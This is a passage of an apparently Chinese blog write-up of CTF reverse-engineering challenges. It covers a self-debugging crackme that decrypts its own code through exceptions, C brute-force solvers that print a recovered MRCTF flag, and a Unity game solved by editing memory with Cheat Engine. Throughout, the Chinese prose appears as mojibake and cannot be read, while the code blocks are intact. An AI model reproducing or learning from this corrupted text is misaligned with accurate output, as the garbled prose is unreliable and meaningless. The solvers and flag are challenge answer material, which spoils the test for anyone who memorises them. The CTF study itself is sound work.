‡å¿—è¢«è®¾ç½®ï¼Œè°ƒç”¨è¿›ç¨‹å°†è¢«å½“ä½œä¸€ä¸ªè°ƒè¯•ç¨‹åºï¼Œå¹¶ä¸”æ–°è¿›ç¨‹ä¼šè¢«å½“ä½œè¢«è°ƒè¯•çš„è¿›ç¨‹ã€‚ç³»ç»ŸæŠŠè¢«è°ƒè¯•ç¨‹åºå‘ç”Ÿçš„æ‰€æœ‰è°ƒè¯•äº‹ä»¶é€šçŸ¥ç»™è°ƒè¯•å™¨ã€‚</strong></p><p><strong>ä¸Šé¢2ä¸ªä¸åŒç‚¹åœ¨äºDEBUG_PROCESSä¼šè°ƒè¯•è¢«è°ƒè¯•è¿›ç¨‹ä»¥åŠå®ƒçš„æ‰€æœ‰å­è¿›ç¨‹ï¼Œè€ŒDEBUG_ONLY_THIS_PROCESSåªè°ƒè¯•è¢«è°ƒè¯•è¿›ç¨‹ï¼Œä¸è°ƒè¯•å®ƒçš„å­è¿›ç¨‹ã€‚</strong></p></blockquote><p>ç»§ç»­å°±æ˜¯åˆ†æåé¢çˆ¶è¿›ç¨‹å¤„ç†å­è¿›ç¨‹å¼‚å¸¸çš„éƒ¨åˆ†sub_40188D()ï¼š</p><p><img src="https://i.loli.net/2021/04/12/NsBlrSXueFjwH2C.png" alt="image-20210412111950176"></p><p>å…³é”®æ˜¯çœ‹DebugEvent.dwDebugEventCode == 1çš„æ´»åŠ¨ï¼šæ¥å—å¤„ç†æ¥è‡ªå­è¿›ç¨‹çš„å¼‚å¸¸ï¼Œè¿›è€Œä¿®æ”¹å­è¿›ç¨‹ä»£ç ã€‚</p><p><img src="https://i.loli.net/2021/04/12/szbXIDkcymFJGUo.png" alt="image-20210412112837615"></p><p>æ‰€ä»¥ç°åœ¨å…³é”®å°±æ˜¯è¦å»å¯»æ‰¾å­è¿›ç¨‹è¦æ‰§è¡Œå‡½æ•°ä¸­å‡ºç°è§¦å‘å¼‚å¸¸åœ°æ–¹ï¼Œè¿›è€Œå¯¹ç€çˆ¶è¿›ç¨‹å¤„ç†æ¨¡å—åˆ†æã€‚è¿™é‡Œæˆ‘ç›´æ¥è°ƒè¯•äº†ä¸‹çˆ¶è¿›ç¨‹ï¼Œè®°å½•å®ƒå¤„ç†å­è¿›ç¨‹å¼‚å¸¸çš„ä½ç½®å’Œå¤„ç†æ–¹å¼ï¼Œéšåè‡ªå·±ç”¨idapythonå»patchä¸€ä¸‹ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ç¬¬ä¸€æ¬¡äº¤äº’ï¼šé€šè¿‡é™¤<span class="number">0</span>å¼‚å¸¸è§¦å‘</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">374</span>; i &gt;= <span class="number">0</span>; --i )</span><br><span class="line">    Buffer[i] ^= Buffer[i + <span class="number">1</span>] ^ i;             <span class="comment">// å¯¹è¡¨è¿›è¡Œäº†ä¸€ä¸ªç®€å•å¼‚æˆ–è¿ç®—ã€‚</span></span><br><span class="line">  Buffer[<span class="number">375</span>] = <span class="number">120</span>;</span><br><span class="line">rip += <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">ç¬¬äºŒæ¬¡äº¤äº’ï¼šé€šè¿‡int3äº¤äº’ï¼Œè§£å¯†ä»£ç ã€‚</span><br><span class="line">åœ°å€ï¼š<span class="number">0x0000401E1C</span></span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0x57D</span>; ++i )</span><br><span class="line">    *((_BYTE *)v5 + i) ^= i;</span><br><span class="line">  </span><br><span class="line">rip += <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">ç¬¬ä¸‰æ¬¡ï¼Œåœ¨patchåçš„ä»£ç ç¬¬ä¸€æ¬¡é‡åˆ°int3,è§¦å‘å¼‚å¸¸äº¤äº’ï¼š</span><br><span class="line">rip += <span class="number">2</span></span><br></pre></td></tr></table></figure><p>patchæ–‡ä»¶ï¼Œå¹¶nopæ— ç”¨çš„ä»£ç ï¼š</p><p><img src="https://i.loli.net/2021/04/14/2xEwBcXAsW4thbu.png" alt="mwGU5aZ38l4PAWc"></p><p>éšååˆ†æç¨‹åºçš„å…³é”®æµç¨‹ï¼Œä¹Ÿå°±æ˜¯å­è¿›ç¨‹æ‰§è¡Œçš„ï¼Œå…ˆåˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œå°†è¾“å…¥è¿›è¡ŒåŠ å¯†åçš„æ•°æ®å†™å…¥è¯¥æ–‡ä»¶ä¸­ï¼Œæœ€åå–å‡ºæ–‡ä»¶ä¸­çš„æ•°æ®ä¸æŒ‡å®šç¼–ç æ•°æ®å¯¹æ¯”ã€‚</p><p>è€Œå…³é”®åŠ å¯†å‡½æ•°å°±æ˜¯ä¹‹å‰patchåçš„ï¼šå°±æ˜¯ç”¨æˆ‘ä»¬çš„è¾“å…¥å¯è§å­—ç¬¦ï¼Œå› ä¸ºæœ€é«˜ä¸º0ï¼Œæ‰€ä»¥åªç”¨äº†7ä½ï¼Œåˆ†æˆ3 3 1ä¸‰éƒ¨åˆ†ä½œä¸ºindexï¼Œç½®æ¢è¡¨çš„è¿‡ç¨‹ã€‚è¿™é‡Œçš„emailå…¶å®å¹¶æ²¡æœ‰ä½œä¸ºæ¯”è¾ƒï¼Œçœ‹åˆ°æœ€åç”¨äº†æœ‰ä¸€ä¸ªå¼‚æˆ–æ“ä½œï¼Œè€Œåœ¨æœ€åçš„æ¯”å¯¹è¿‡ç¨‹ä¸­ä¹Ÿæœ‰ä¸€ä¸ªåŒæ ·çš„æ“ä½œï¼Œå°±è¿˜åŸäº†ï¼Œæ‰€ä»¥å¯†æ–‡å°±æ˜¯ä¸ç»è¿‡å¼‚æˆ–åŠ å¯†åçš„ç»“æœã€‚<br><img src="https://i.loli.net/2021/04/12/wfFu2ZJQS6IL4N1.png" alt="image-20210412114342071"></p><p>æœ€åå…ˆçˆ†ç ´ï¼Œå†è¿›è¡Œä¸€ä¸ªbytes.fromhex()ï¼Œæœ€åä¸€ä¸ªå‡æ³•ã€‚æ¯”èµ›æ—¶èµ¶æ—¶é—´å†™çš„ï¼Œæ¯”è¾ƒæ°´ï¼Œç”¨pythonå¤„ç†èµ·æ¥æ–¹ä¾¿ä¸€äº›ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> enc[] = &#123;<span class="number">71</span>, <span class="number">90</span>, <span class="number">53</span>, <span class="number">121</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">105</span>, <span class="number">71</span>, <span class="number">88</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">53</span>, <span class="number">122</span>, <span class="number">71</span>, <span class="number">88</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">87</span>, <span class="number">72</span>, <span class="number">108</span>, <span class="number">72</span>, <span class="number">108</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">88</span>, <span class="number">53</span>, <span class="number">119</span>, <span class="number">71</span>, <span class="number">86</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">90</span>, <span class="number">53</span>, <span class="number">119</span>, <span class="number">71</span>, <span class="number">89</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">107</span>, <span class="number">53</span>, <span class="number">118</span>, <span class="number">71</span>, <span class="number">106</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">53</span>, <span class="number">120</span>, <span class="number">72</span>, <span class="number">108</span>, <span class="number">53</span>, <span class="number">121</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">87</span>, <span class="number">71</span>, <span class="number">90</span>, <span class="number">53</span>, <span class="number">118</span>, <span class="number">71</span>, <span class="number">87</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">88</span>, <span class="number">71</span>, <span class="number">87</span>, <span class="number">72</span>, <span class="number">108</span>, <span class="number">53</span>, <span class="number">121</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">89</span>, <span class="number">71</span>, <span class="number">106</span>, <span class="number">53</span>, <span class="number">118</span>, <span class="number">71</span>, <span class="number">107</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">105</span>, <span class="number">72</span>, <span class="number">108</span>, <span class="number">71</span>, <span class="number">106</span>, <span class="number">71</span>, <span class="number">90</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">72</span>, <span class="number">108</span>, <span class="number">53</span>, <span class="number">84</span>, <span class="number">72</span>, <span class="number">108</span>, <span class="number">71</span>, <span class="number">86</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">53</span>, <span class="number">122</span>, <span class="number">72</span>, <span class="number">108</span>, <span class="number">71</span>, <span class="number">90</span>, <span class="number">71</span>, <span class="number">89</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">87</span>, <span class="number">71</span>, <span class="number">107</span>, <span class="number">72</span>, <span class="number">108</span>, <span class="number">71</span>, <span class="number">88</span>, <span class="number">71</span>, <span class="number">107</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">88</span>, <span class="number">71</span>, <span class="number">106</span>, <span class="number">71</span>, <span class="number">86</span>, <span class="number">72</span>, <span class="number">109</span>, <span class="number">53</span>, <span class="number">121</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">89</span>, <span class="number">53</span>, <span class="number">121</span>, <span class="number">72</span>, <span class="number">109</span>, <span class="number">71</span>, <span class="number">88</span>, <span class="number">71</span>, <span class="number">106</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">106</span>, <span class="number">71</span>, <span class="number">89</span>, <span class="number">53</span>, <span class="number">118</span>, <span class="number">71</span>, <span class="number">89</span>, <span class="number">72</span>, <span class="number">108</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">53</span>, <span class="number">118</span>, <span class="number">71</span>, <span class="number">87</span>, <span class="number">71</span>, <span class="number">89</span>, <span class="number">53</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">105</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">87</span>, <span class="number">71</span>, <span class="number">86</span>, <span class="number">71</span>, <span class="number">90</span>, <span class="number">53</span>, <span class="number">122</span>, <span class="number">71</span>, <span class="number">105</span>, <span class="number">53</span>, <span class="number">120</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">87</span>, <span class="number">53</span>, <span class="number">118</span>, <span class="number">71</span>, <span class="number">106</span>, <span class="number">71</span>, <span class="number">88</span>, <span class="number">71</span>, <span class="number">105</span>, <span class="number">71</span>, <span class="number">88</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">88</span>, <span class="number">53</span>, <span class="number">118</span>, <span class="number">53</span>, <span class="number">119</span>, <span class="number">71</span>, <span class="number">87</span>, <span class="number">71</span>, <span class="number">88</span>, <span class="number">71</span>, <span class="number">88</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">90</span>, <span class="number">71</span>, <span class="number">105</span>, <span class="number">71</span>, <span class="number">87</span>, <span class="number">71</span>, <span class="number">89</span>, <span class="number">53</span>, <span class="number">119</span>, <span class="number">71</span>, <span class="number">89</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">106</span>, <span class="number">53</span>, <span class="number">84</span>, <span class="number">53</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">105</span>, <span class="number">71</span>, <span class="number">89</span>, <span class="number">71</span>, <span class="number">90</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">53</span>, <span class="number">119</span>, <span class="number">71</span>, <span class="number">90</span>, <span class="number">53</span>, <span class="number">121</span>, <span class="number">72</span>, <span class="number">109</span>, <span class="number">71</span>, <span class="number">105</span>, <span class="number">71</span>, <span class="number">105</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">87</span>, <span class="number">71</span>, <span class="number">88</span>, <span class="number">71</span>, <span class="number">90</span>, <span class="number">72</span>, <span class="number">109</span>, <span class="number">53</span>, <span class="number">122</span>, <span class="number">53</span>, <span class="number">119</span>, <span class="number">72</span>, <span class="number">109</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">87</span>, <span class="number">53</span>, <span class="number">121</span>, <span class="number">72</span>, <span class="number">109</span>, <span class="number">71</span>, <span class="number">107</span>, <span class="number">72</span>, <span class="number">108</span>, <span class="number">71</span>, <span class="number">106</span>, <span class="number">53</span>, <span class="number">121</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">88</span>, <span class="number">53</span>, <span class="number">84</span>, <span class="number">53</span>, <span class="number">122</span>, <span class="number">71</span>, <span class="number">87</span>, <span class="number">71</span>, <span class="number">107</span>, <span class="number">72</span>, <span class="number">109</span>, <span class="number">53</span>, <span class="number">121</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">90</span>, <span class="number">53</span>, <span class="number">121</span>, <span class="number">71</span>, <span class="number">107</span>, <span class="number">72</span>, <span class="number">109</span>, <span class="number">71</span>, <span class="number">86</span>, <span class="number">71</span>, <span class="number">106</span>, <span class="number">53</span>, <span class="number">119</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">107</span>, <span class="number">53</span>, <span class="number">121</span>, <span class="number">71</span>, <span class="number">105</span>, <span class="number">53</span>, <span class="number">118</span>, <span class="number">72</span>, <span class="number">108</span>, <span class="number">71</span>, <span class="number">90</span>, <span class="number">71</span>, <span class="number">87</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">53</span>, <span class="number">120</span>, <span class="number">53</span>, <span class="number">118</span>, <span class="number">53</span>, <span class="number">121</span>, <span class="number">71</span>, <span class="number">89</span>, <span class="number">72</span>, <span class="number">108</span>, <span class="number">53</span>, <span class="number">120</span>, <span class="number">53</span>, <span class="number">121</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">87</span>, <span class="number">71</span>, <span class="number">90</span>, <span class="number">72</span>, <span class="number">108</span>, <span class="number">71</span>, <span class="number">88</span>, <span class="number">53</span>, <span class="number">122</span>, <span class="number">71</span>, <span class="number">87</span>, <span class="number">72</span>, <span class="number">108</span>, <span class="number">53</span>, <span class="number">119</span>, <span class="number">69</span>, <span class="number">120</span>&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> table[<span class="number">9</span>][<span class="number">9</span>] = &#123;<span class="string">"ABCDEFGH"</span>, <span class="string">"12345678"</span>, <span class="string">"0IJKLMNO"</span>, <span class="string">"+OPQRStu"</span>, </span><br><span class="line"><span class="string">"\\vwxyzTU"</span>, <span class="string">"abcdefgh"</span>, <span class="string">"VWXYZijk"</span>, <span class="string">"lmnopqrs"</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i, j, v25, v24, v23, ans1, ans2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">12</span>; i &lt; <span class="keyword">sizeof</span>(enc)<span class="number">-1</span>; i += <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">32</span>; j &lt; <span class="number">127</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">char</span> ch = j;</span><br><span class="line">v25 = (ch &gt;&gt; <span class="number">6</span>) &amp; <span class="number">1</span>;</span><br><span class="line">    v24 = (ch &gt;&gt; <span class="number">3</span>) &amp; <span class="number">7</span>;</span><br><span class="line">    v23 =  ch &amp; <span class="number">7</span>;</span><br><span class="line">    ans1 = table[v25][v24];</span><br><span class="line">    ans2 = table[v24][v23];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(ans1 == enc[i] &amp;&amp; ans2 == enc[i+<span class="number">1</span>])</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="built_in">putchar</span>(j);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//printf("%d %d", ans1, ans2);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> enc[<span class="number">100</span>] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0x4d</span>, <span class="number">0x52</span>, <span class="number">0xe2</span>, <span class="number">0x188</span>, <span class="number">0x2b0</span>, <span class="number">0x4b3</span>, <span class="number">0x7a6</span>, <span class="number">0xc8d</span>, <span class="number">0x14a1</span>, <span class="number">0x218d</span>, <span class="number">0x36a7</span>, <span class="number">0x5864</span>, <span class="number">0x8f80</span>, <span class="number">0xe843</span>, <span class="number">0x17827</span>, <span class="number">0x2609d</span>, <span class="number">0x3d926</span>, <span class="number">0x63a38</span>, <span class="number">0xa13c5</span>, <span class="number">0x104e5c</span>, <span class="number">0x1a6252</span>, <span class="number">0x2ab122</span>, <span class="number">0x4513b3</span>, <span class="number">0x6fc534</span>, <span class="number">0xb4d955</span>, <span class="number">0x1249eb9</span>, <span class="number">0x1d9786d</span>, <span class="number">0x2fe179d</span>, <span class="number">0x4d7906b</span>, <span class="number">0x7d5a841</span>, <span class="number">0xcad38cd</span>, <span class="number">0x1482e18b</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> init = enc[<span class="number">0</span>]+enc[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">flag[<span class="number">0</span>] = enc[<span class="number">0</span>], flag[<span class="number">1</span>] = enc[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">2</span>; i &lt; <span class="number">100</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">flag[i] = enc[i]-enc[i<span class="number">-1</span>]-enc[i<span class="number">-2</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++)</span><br><span class="line"><span class="built_in">putchar</span>(flag[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//MRCTF&#123;C4n_y0u_d3bug_1t?_n0_wa9!&#125;</span></span><br></pre></td></tr></table></figure><h3 id="EzGame"><a href="#EzGame" class="headerlink" title="EzGame"></a>EzGame</h3><p>æ¸¸æˆçœŸå¥½ç©ã€‚</p><p>ä¹‹å‰å˜¶å¼CTFåšè¿‡ä¸€ä¸ªé­”å¡”çš„æ¸¸æˆï¼Œä¹Ÿæ˜¯æœ‰å‡ ä¸ªé€šå…³æ¡ä»¶ä½†æ›´è‹›åˆ»ï¼Œä½†æ˜¯é‚£ä¸ªå¹¶ä¸æ˜¯unity3då†™çš„ï¼Œç›´æ¥é€†å‘ç¨‹åºçœ‹æ¸¸æˆçš„é€»è¾‘æ‰¾æ¯ä¸ªå…³é”®ç‚¹è¿˜æ˜¯èƒ½åˆ†æã€‚è¿™ä¸ªæ¸¸æˆæœ¬èº«ç”¨unity3då†™éš¾åº¦å°±å¤§äº†å¾ˆå¤šï¼Œè¿˜å¯¹ä¸€ä¸ªdllè¿›è¡ŒThemida / Winlicense v3.0.0.0 - 3.0.4.0åŠ å£³ã€‚</p><p>æäº†äº›æ—¶é—´ï¼Œæ²¡æœ‰æŠŠç¨‹åºæ­£å¸¸è°ƒè¯•èµ·æ¥ï¼Œå¼€å§‹æ‰“ç”¨CEçš„ä¸»æ„ã€‚ã€‚</p><p>å¸¸è§„çš„é€šè¿‡æ˜Ÿæ˜Ÿæ•°çš„å¢åŠ ï¼Œä¸æ–­å†æ¬¡æ‰«æç¼©å°èŒƒå›´æ‰¾åˆ°å­˜æ”¾å…¶å€¼çš„å†…å­˜æ‰€åœ¨çš„ä½ç½®ã€‚</p><p><img src="https://i.loli.net/2021/04/12/O6b8jr5AfghM9q3.png" alt="image-20210412125603706"></p><p>å› ä¸ºæœ€åè·å¾—flagçš„è¿˜æœ‰ä¸€ä¸ªæ¡ä»¶å°±æ˜¯æ­»äº¡æ¬¡æ•°ä¸èƒ½å¤ªå¤šï¼Œé‚£å°±è¿˜æœ‰ä¸€ä¸ªè®°å½•æ­»äº¡æ¬¡æ•°çš„å˜é‡ï¼ŒåŒæ ·çš„æ–¹æ³•æ‰¾åˆ°å†…å­˜ä½ç½®ã€‚ä½†å…¶å®ƒä¸‰ä¸ªæ¡ä»¶æ˜¯å¦è¾¾æˆæ ‡å¿—çš„å†…å­˜ä½ç½®å‘¢ã€‚</p><p>è¿™æ—¶å€™æˆ‘è§‚å¯Ÿæˆ‘è®°å½•ä¸‹çš„æ˜Ÿæ˜Ÿæ•°å’Œæ­»äº¡æ¬¡æ•°çš„å†…å­˜åœ°å€ï¼šå¯ä»¥å‘ç°è¿™2ä¸ªå†…å­˜åœ°å€éš”çš„å¾ˆè¿‘ï¼Œè¿™å°±è®©æˆ‘æƒ³åˆ°å…¶ä½™åˆ¤æ–­æ¡ä»¶çš„å†…å­˜åœ°å€ä¹Ÿæ˜¯åœ¨è¿™å—åŒºåŸŸï¼Œå°±åœ¨é™„è¿‘ã€‚</p><p><img src="https://i.loli.net/2021/04/12/FjxvnrsNSMdKLcD.png" alt="image-20210412130845062"></p><p>å¼€å§‹è¯•æ¢å¯»æ‰¾å¦å¤–ä¸‰ä¸ªæ¡ä»¶çš„å†…å­˜ä½ç½®ã€‚</p><p>å› ä¸ºEat Cookieæ˜¯å¯å®ç°çš„ï¼Œæ‰€ä»¥æµè§ˆç›¸å…³å†…å­˜åŒºåŸŸåæˆ‘å»Eat Cookieï¼Œç„¶åçœ‹å†…å­˜å˜åŒ–ã€‚</p><p>å‘ç°ä¸‹å›¾ä¸­çš„å†…å­˜ä½ç½®å˜äº†ï¼Œç„¶åæˆ‘ä»¥ä¸ºè¿™ä¸ªæ ‡å¿—æ˜¯å››å­—èŠ‚æ•°æ®ï¼Œå…¶åé¢è·Ÿç€çš„æ˜¯6æ˜¯æ­»äº¡æ¬¡æ•°ï¼Œé‚£å†åé¢çš„æˆ–è®¸å°±æ˜¯å…¶ä½™2ä¸ªæ¡ä»¶çš„æ ‡å¿—å†…å­˜åŒºåŸŸå§ã€‚</p><p><img src="https://i.loli.net/2021/04/12/f7tDeKoRiP6YsQd.png" alt="image-20210412131401847"></p><p>å¼€å§‹æŠŠåé¢æ‰€æœ‰çš„æ•°æ®ä½œä¸º4å­—èŠ‚æ•°æ®ï¼Œç„¶åéƒ½æ”¹ä¸º1ï¼Œå›åˆ°æ¸¸æˆï¼Œå‘ç°å…¶ä½™2ä¸ªæ¡ä»¶å¹¶æ²¡æœ‰å˜ä¸ºTrueã€‚ã€‚ã€‚</p><p>ä½†è¿˜æœ‰ä¸€ä¸ªæ¡ä»¶GoHomeä¹Ÿæ˜¯å¯ä»¥æ‰“æ¸¸æˆåˆ°è¾¾çš„ï¼Œåˆ°è¾¾åå†æ¬¡è§‚å¯Ÿå†…å­˜å˜åŒ–ï¼Œå‘ç°äº†ç«¯å€ªï¼Œå…¶å®3ä¸ªæ¡ä»¶çš„æ ‡å¿—å˜é‡æ˜¯ä¸€ä¸ªå­—èŠ‚çš„æ•°æ®ï¼Œä¹Ÿå°±æ˜¯å­˜Eat Cookieæ ‡å¿—å†…å­˜åœ°å€è·Ÿç€çš„2ä¸ªå­—èŠ‚ã€‚</p><p>ç°åœ¨æŠŠæ‰€æœ‰æ¡ä»¶é€šè¿‡ä¿®æ”¹å†…å­˜è¾¾æˆï¼ŒGetFlagï¼š</p><p><img src="https://i.loli.net/2021/04/12/CrNxG7igVQHTWja.png" alt="image-20210412132340392"></p><p>å…¶å®çŒœä¹Ÿæ˜¯ï¼Œä¸ä¼šè¿™æ ·å°±æŠŠflagå¾—åˆ°äº†ï¼Œï¼Œä¹‹å‰å˜¶å¼çš„é­”å¡”æ¸¸æˆå°±æœ‰å¾ˆå¤šåˆ¤æ–­ï¼Œæ­¥æ•°å•Šï¼Œè¡€é‡ï¼Œèµ°çš„è·¯å¾„ç­‰å„ç§å‚æ•°å»è®¡ç®—å‡ºflagã€‚è¿™ä¸ªé¢˜åº”è¯¥ä¹Ÿæ˜¯è¿™æ ·çš„ã€‚ã€‚</p><p>åœ¨å¢åŠ æ˜Ÿæ˜Ÿæ•°æ—¶æˆ‘ä¹‹å‰è§‚å¯Ÿåˆ°äº†åé¢æœ‰8ä¸ªå­—èŠ‚çš„æ•°æ®åœ¨ä¸æ–­å‘ç”Ÿå˜åŒ–ï¼Œè€Œè¦å¾—åˆ°flagå°±è¦æ˜Ÿæ˜Ÿæ•°æ­£ç¡®ï¼Œè€Œæ˜Ÿæ˜Ÿæ•°åˆå½±å“é‚£8å­—èŠ‚æ•°æ®ï¼Œè‡ªç„¶æƒ³åˆ°é‚£8å­—èŠ‚æ•°æ®å½±å“ç€æœ€åflagã€‚ã€‚</p><p>è¿™æ—¶å€™æˆ‘æœ‰2ä¸ªæƒ³æ³•ï¼š</p><ul><li><p>ä¸€æ˜¯æ‰¾æ–¹æ³•è®¡ç®—å‡ºæ˜Ÿæ˜Ÿæ•°ä¸º105æ—¶çš„8å­—èŠ‚æ•°æ®ï¼›</p></li><li><p>äºŒæ˜¯æ‰¾åˆ°è®°å½•æ‰€èƒ½è·³é«˜åº¦çš„å†…å­˜ä½ç½®æˆ–è®°å½•å½“å‰ä½ç½®çš„å‚æ•°ï¼Œä¿®æ”¹åè¾¾åˆ°å¤–æŒ‚ä¸€æ ·ï¼Œå°†æ˜Ÿæ˜Ÿæ•°ä¸€ä¸ªä¸€ä¸ªåƒæ‰ã€‚</p></li></ul><p>ç¬¬äºŒä¸ªæƒ³æ³•å°è¯•äº†ä¸€ä¸‹ï¼Œä¸æ–­å˜åŒ–ä½ç½®ï¼Œå¹¶æ²¡æœ‰åœ¨é™„è¿‘çš„å†…å­˜ä¸­å‘ç°å˜åŒ–ï¼Œå€’æ˜¯å‘ç°äº†è®°å½•å½“å‰å·²ç»è·³åŠ¨æ­¥æ•°çš„å†…å­˜ä½ç½®ï¼Œç„¶åå°±æ²¡æœ‰åç»­äº†ï¼ˆã€‚ã€‚</p><p>ç„¶åå°è¯•æ‰¾å‡ºè®¡ç®—8å­—èŠ‚æ•°æ®çš„æ–¹æ³•ï¼Œï¼Œå…ˆdumpå‡ºå‡ 